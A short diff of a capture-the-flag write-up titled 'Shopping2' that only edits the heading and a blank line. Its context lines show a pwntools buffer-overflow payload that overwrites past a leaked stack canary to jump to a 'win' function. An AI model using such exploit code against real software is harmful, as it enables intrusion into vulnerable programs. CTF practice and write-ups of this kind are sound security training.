@@ -1,4 +1,4 @@
-# Shopping2 writeup
+# Shopping2
 
 Author: `misi`
 
@@ -145,5 +145,4 @@ p.send(b"A"*244+p64(canary)+b"A"*8+p64(win))
 
 p.interactive()
 ```
-
 
